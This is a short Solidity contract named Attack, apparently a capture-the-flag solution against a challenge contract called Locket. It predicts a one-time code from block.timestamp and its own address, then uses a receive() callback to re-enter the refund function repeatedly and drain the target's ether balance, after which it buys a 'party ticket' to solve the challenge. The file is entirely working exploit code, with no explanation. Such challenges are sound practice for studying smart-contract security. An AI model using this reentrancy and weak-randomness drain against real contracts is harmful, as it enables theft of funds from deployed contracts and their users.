// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "chall/Locket.sol";

contract Attack {
    address public owner;
    Locket public locket;
    constructor(address _locketAddress) payable {
        owner = msg.sender;
        locket = Locket(_locketAddress);
    }

    function exploit()public{
        locket.buyNormalTicket{value: 5 ether}();
        uint otp = uint(keccak256(abi.encodePacked(block.timestamp, address(this)))) % 1000000;
        locket.refundNormalTicket(otp);    
    }

    function solve()public{
        locket.buyPartyTicket{value: 30 ether}();
    }
    receive() external payable { 
        
        if(address(locket).balance > 0){
            uint otp = uint(keccak256(abi.encodePacked(block.timestamp, address(this)))) % 1000000;
            locket.refundNormalTicket(otp);
        }

    }

    
}